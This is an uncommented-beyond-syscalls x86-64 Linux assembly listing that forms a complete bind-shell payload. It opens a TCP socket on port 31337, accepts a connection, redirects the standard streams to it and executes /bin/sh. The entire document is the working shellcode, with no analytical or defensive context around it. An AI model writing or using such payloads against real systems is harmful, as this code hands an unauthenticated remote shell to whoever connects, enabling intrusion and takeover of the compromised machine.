; s = socket(2, 1, 0)
push 0x29
pop rax
cdq
push 0x2
pop rdi
push 0x1
pop rsi
syscall
; bind(s, [2, port, 0], 16)
xchg rax, rdi
mov al, 0x31
push rdx
push word 0x697a ; 31337
push word 0x2
push rsp
pop rsi
mov dl, 0x10
syscall
; listen(s, 0)
mov al, 0x32
xor esi, esi
syscall
; c = accept(s, 0, 0)
mov al, 0x2b
cdq
syscall
; dup2(c, {2, 1, 0}); 
xchg rax, rdi
mov esi, edi
loop:
mov al, 0x21
syscall
dec esi
jns loop
; execve("/bin/sh", 0, 0)
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
cdq
mov al, 0x3b
syscall
